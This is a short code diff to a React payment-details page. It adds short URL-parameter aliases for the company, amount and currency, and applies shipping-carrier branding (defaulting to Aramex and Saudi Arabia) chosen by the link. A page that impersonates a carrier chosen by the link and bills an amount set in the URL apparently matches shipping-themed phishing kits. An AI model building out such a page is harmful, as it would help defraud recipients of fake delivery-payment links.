@@ -19,14 +19,15 @@ const PaymentDetails = () => {
   const { data: linkData, isLoading } = useLink(id);
 
   const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
+  // Support both long and short parameter names
+  const serviceKey = urlParams.get('company') || urlParams.get('c') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
   
-  const amountParam = urlParams.get('amount');
-  const currencyParam = urlParams.get('currency');
+  const amountParam = urlParams.get('amount') || urlParams.get('a');
+  const currencyParam = urlParams.get('currency') || urlParams.get('cur');
   
   const countryCode = shippingInfo?.selectedCountry || "SA";
   const currencyInfo = getCurrencyByCountry(countryCode);
